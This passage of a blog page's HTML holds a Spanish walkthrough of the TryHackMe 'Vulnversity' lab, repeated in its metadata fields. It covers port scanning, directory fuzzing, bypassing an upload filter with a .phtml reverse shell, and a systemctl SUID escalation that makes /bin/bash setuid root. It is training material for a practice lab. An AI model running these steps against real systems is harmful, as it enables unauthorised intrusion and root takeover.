@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Vulnversity - TryHackMe</title>
+
+  <link rel="shortcut icon" href="/assets/images/favicon.ico">
+  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnversity - TryHackMe | Filthy Hacker</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Vulnversity - TryHackMe" />
+<meta name="author" content="m4teo" />
+<meta property="og:locale" content="es" />
+<meta name="description" content="El día de hoy vamos a resolver la máquina Vulnversity de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de TryHackMe, existen diversos cheatsheets que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta. No obstante, recordemos que varias herramientas por defecto tienen incluidas un manual o vienen con un comando --help. man nmap nmap --help Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos abiertos existen? ¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando? ¿En qué puerto está corriendo el servidor web? ¿Qué versión de squid proxy está corriendo en la máquina? Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con Nmap. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son: ¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400? Utilizando el parámetro -n, ¿qué no se está resolviendo? Para responder a estas dos preguntas bastará con haber leído el manual de Nmap, haber utilizado su parámetro --help, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de -p-, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro -n, no se aplicará resolución DNS. Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el fuzzing; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web. TryHackMe nos recomienda utilizar GoBuster, sin embargo, personalmente prefiero el uso de Wfuzz; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente: sudo apt install wfuzz Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de fuzzear la página web, para ello realizaremos lo siguiente: wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ A continuación se explican los parámetros utilizados en el fuzzeo del servidor web: Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hc Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404) --hh Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan -w Especificamos el diccionario con el que queremos trabajar En caso de no utilizar el parámetro -hh, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió. Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección internal, ya que en images, css, js y fonts parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección internal, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una reverse shell. Fase De Explotación Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una reverse shell; podemos descargar una aquí. Una vez la hayamos descargado, tenemos que modificar el valor de la ip (colocamos la nuestra), y si queremos, podemos también modificar el valor del puerto, aunque esto es completamente opcional. Sin embargo, cuando intentamos subir nuestra reverse shell, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida. Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar Burp Suite para poder realizar un ataque de tipo Sniper. Para ello, vamos a empezar por volver a subir nuestra reverse shell, pero ahora tramitando todas las peticiones a través de Burp Suite. Posterior a ello presionaremos Ctrl + I para enviar esta petición al Intruder. Ahora, en el apartado Positions, en el tipo de ataque elegiremos la opción de Sniper, después seleccionaremos la opción Clear §, para posteriormente con nuestro cursor resaltar la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción Add §; esto se vería algo así: Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de PHP: .php .phtml .php3 .php4 .php5 .php7 .phps .php-s .pht .phar Una vez, hemos creado nuestro diccionario, en el apartado Payloads, en la opción Sample List cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos. Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado 200, la longitud de estas no es la misma para todas las extensiones, la única extensión cuya longitud varía es .phtml; si quisiéramos estar completamente seguros, podríamos revisar el render de la respuesta, el cual nos devuelve un success. Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta internal, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez. Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra reverse shell a través de Netcat. A partir de aquí podemos hacer dos cosas: Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de TryHackMe), es decir, entrar a: http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml O, por otra parte, y sin dejar la consola, utilizar el comando curl: curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml Ambas opciones, nos conseguirán una consola dentro de la máquina víctima. Es importante aclarar que la consola que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la consola utilizando Ctrl + L, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las flechas del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la TTY, para lo cual haremos lo siguiente: script /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash stty rows &lt;valor&gt; columns &lt;valor&gt; Los valores que colocaremos en &lt;valor&gt; en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente: stty -a Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio /home, y listar los directorios que existen. Aunque también podríamos filtrar del archivo /etc/passwd, a través de expresiones regulares, todos aquello usuario que tengan una shell, sea esta una: bash csh ksh sh tcsh zsh Esto sería bastante fácil, ya que todas, o casi todas las shells terminan en sh, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema. cat /etc/passwd | grep &quot;sh$&quot; Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente: find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos SUID mal asignados. El binario más extraño que nos encontramos es /bin/systemctl, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en GTFOBins. Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos Para conseguir la última flag haremos lo siguiente: TF=$(mktemp).service echo &#39;[Service] Type=oneshot ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot; [Install] WantedBy=multi-user.target&#39; &gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF Si nos percatamos, lo único que modificamos de la información que nos provee GTFOBins, fue el código a ejecutar, en este caso, estamos asignando un permiso SUID a la /bin/bash, para posteriormente, a través del parámetro -p, ejecutar el binario /bin/bash manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario /bin/systemctl desde su ruta absoluta, mas no de su ruta relativa. Una vez hemos abusado del binario /bin/systemctl, haremos lo siguiente: /bin/bash -p Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así: find / -name root.txt" />
+<meta property="og:description" content="El día de hoy vamos a resolver la máquina Vulnversity de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de TryHackMe, existen diversos cheatsheets que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta. No obstante, recordemos que varias herramientas por defecto tienen incluidas un manual o vienen con un comando --help. man nmap nmap --help Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos abiertos existen? ¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando? ¿En qué puerto está corriendo el servidor web? ¿Qué versión de squid proxy está corriendo en la máquina? Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con Nmap. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son: ¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400? Utilizando el parámetro -n, ¿qué no se está resolviendo? Para responder a estas dos preguntas bastará con haber leído el manual de Nmap, haber utilizado su parámetro --help, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de -p-, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro -n, no se aplicará resolución DNS. Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el fuzzing; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web. TryHackMe nos recomienda utilizar GoBuster, sin embargo, personalmente prefiero el uso de Wfuzz; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente: sudo apt install wfuzz Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de fuzzear la página web, para ello realizaremos lo siguiente: wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ A continuación se explican los parámetros utilizados en el fuzzeo del servidor web: Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hc Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404) --hh Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan -w Especificamos el diccionario con el que queremos trabajar En caso de no utilizar el parámetro -hh, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió. Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección internal, ya que en images, css, js y fonts parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección internal, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una reverse shell. Fase De Explotación Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una reverse shell; podemos descargar una aquí. Una vez la hayamos descargado, tenemos que modificar el valor de la ip (colocamos la nuestra), y si queremos, podemos también modificar el valor del puerto, aunque esto es completamente opcional. Sin embargo, cuando intentamos subir nuestra reverse shell, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida. Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar Burp Suite para poder realizar un ataque de tipo Sniper. Para ello, vamos a empezar por volver a subir nuestra reverse shell, pero ahora tramitando todas las peticiones a través de Burp Suite. Posterior a ello presionaremos Ctrl + I para enviar esta petición al Intruder. Ahora, en el apartado Positions, en el tipo de ataque elegiremos la opción de Sniper, después seleccionaremos la opción Clear §, para posteriormente con nuestro cursor resaltar la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción Add §; esto se vería algo así: Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de PHP: .php .phtml .php3 .php4 .php5 .php7 .phps .php-s .pht .phar Una vez, hemos creado nuestro diccionario, en el apartado Payloads, en la opción Sample List cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos. Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado 200, la longitud de estas no es la misma para todas las extensiones, la única extensión cuya longitud varía es .phtml; si quisiéramos estar completamente seguros, podríamos revisar el render de la respuesta, el cual nos devuelve un success. Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta internal, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez. Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra reverse shell a través de Netcat. A partir de aquí podemos hacer dos cosas: Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de TryHackMe), es decir, entrar a: http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml O, por otra parte, y sin dejar la consola, utilizar el comando curl: curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml Ambas opciones, nos conseguirán una consola dentro de la máquina víctima. Es importante aclarar que la consola que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la consola utilizando Ctrl + L, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las flechas del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la TTY, para lo cual haremos lo siguiente: script /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash stty rows &lt;valor&gt; columns &lt;valor&gt; Los valores que colocaremos en &lt;valor&gt; en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente: stty -a Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio /home, y listar los directorios que existen. Aunque también podríamos filtrar del archivo /etc/passwd, a través de expresiones regulares, todos aquello usuario que tengan una shell, sea esta una: bash csh ksh sh tcsh zsh Esto sería bastante fácil, ya que todas, o casi todas las shells terminan en sh, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema. cat /etc/passwd | grep &quot;sh$&quot; Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente: find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos SUID mal asignados. El binario más extraño que nos encontramos es /bin/systemctl, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en GTFOBins. Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos Para conseguir la última flag haremos lo siguiente: TF=$(mktemp).service echo &#39;[Service] Type=oneshot ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot; [Install] WantedBy=multi-user.target&#39; &gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF Si nos percatamos, lo único que modificamos de la información que nos provee GTFOBins, fue el código a ejecutar, en este caso, estamos asignando un permiso SUID a la /bin/bash, para posteriormente, a través del parámetro -p, ejecutar el binario /bin/bash manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario /bin/systemctl desde su ruta absoluta, mas no de su ruta relativa. Una vez hemos abusado del binario /bin/systemctl, haremos lo siguiente: /bin/bash -p Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así: find / -name root.txt" />
+<link rel="canonical" href="http://0.0.0.0:8000/es/Vulnversity-TryHackMe/" />
+<meta property="og:url" content="http://0.0.0.0:8000/es/Vulnversity-TryHackMe/" />
+<meta property="og:site_name" content="Filthy Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-25T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnversity - TryHackMe" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2021-10-25T00:00:00-04:00","datePublished":"2021-10-25T00:00:00-04:00","description":"El día de hoy vamos a resolver la máquina Vulnversity de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de TryHackMe, existen diversos cheatsheets que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta. No obstante, recordemos que varias herramientas por defecto tienen incluidas un manual o vienen con un comando --help. man nmap nmap --help Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra: ¿Cuántos puertos abiertos existen? ¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando? ¿En qué puerto está corriendo el servidor web? ¿Qué versión de squid proxy está corriendo en la máquina? Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con Nmap. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son: ¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400? Utilizando el parámetro -n, ¿qué no se está resolviendo? Para responder a estas dos preguntas bastará con haber leído el manual de Nmap, haber utilizado su parámetro --help, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de -p-, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro -n, no se aplicará resolución DNS. Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el fuzzing; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web. TryHackMe nos recomienda utilizar GoBuster, sin embargo, personalmente prefiero el uso de Wfuzz; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente: sudo apt install wfuzz Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de fuzzear la página web, para ello realizaremos lo siguiente: wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ A continuación se explican los parámetros utilizados en el fuzzeo del servidor web: Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hc Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404) --hh Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan -w Especificamos el diccionario con el que queremos trabajar En caso de no utilizar el parámetro -hh, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió. Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección internal, ya que en images, css, js y fonts parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección internal, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una reverse shell. Fase De Explotación Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una reverse shell; podemos descargar una aquí. Una vez la hayamos descargado, tenemos que modificar el valor de la ip (colocamos la nuestra), y si queremos, podemos también modificar el valor del puerto, aunque esto es completamente opcional. Sin embargo, cuando intentamos subir nuestra reverse shell, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida. Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar Burp Suite para poder realizar un ataque de tipo Sniper. Para ello, vamos a empezar por volver a subir nuestra reverse shell, pero ahora tramitando todas las peticiones a través de Burp Suite. Posterior a ello presionaremos Ctrl + I para enviar esta petición al Intruder. Ahora, en el apartado Positions, en el tipo de ataque elegiremos la opción de Sniper, después seleccionaremos la opción Clear §, para posteriormente con nuestro cursor resaltar la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción Add §; esto se vería algo así: Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de PHP: .php .phtml .php3 .php4 .php5 .php7 .phps .php-s .pht .phar Una vez, hemos creado nuestro diccionario, en el apartado Payloads, en la opción Sample List cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos. Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado 200, la longitud de estas no es la misma para todas las extensiones, la única extensión cuya longitud varía es .phtml; si quisiéramos estar completamente seguros, podríamos revisar el render de la respuesta, el cual nos devuelve un success. Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta internal, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez. Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra reverse shell a través de Netcat. A partir de aquí podemos hacer dos cosas: Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de TryHackMe), es decir, entrar a: http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml O, por otra parte, y sin dejar la consola, utilizar el comando curl: curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml Ambas opciones, nos conseguirán una consola dentro de la máquina víctima. Es importante aclarar que la consola que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la consola utilizando Ctrl + L, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las flechas del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la TTY, para lo cual haremos lo siguiente: script /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash stty rows &lt;valor&gt; columns &lt;valor&gt; Los valores que colocaremos en &lt;valor&gt; en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente: stty -a Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio /home, y listar los directorios que existen. Aunque también podríamos filtrar del archivo /etc/passwd, a través de expresiones regulares, todos aquello usuario que tengan una shell, sea esta una: bash csh ksh sh tcsh zsh Esto sería bastante fácil, ya que todas, o casi todas las shells terminan en sh, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema. cat /etc/passwd | grep &quot;sh$&quot; Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente: find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos SUID mal asignados. El binario más extraño que nos encontramos es /bin/systemctl, ya que este comando lo que nos permite es 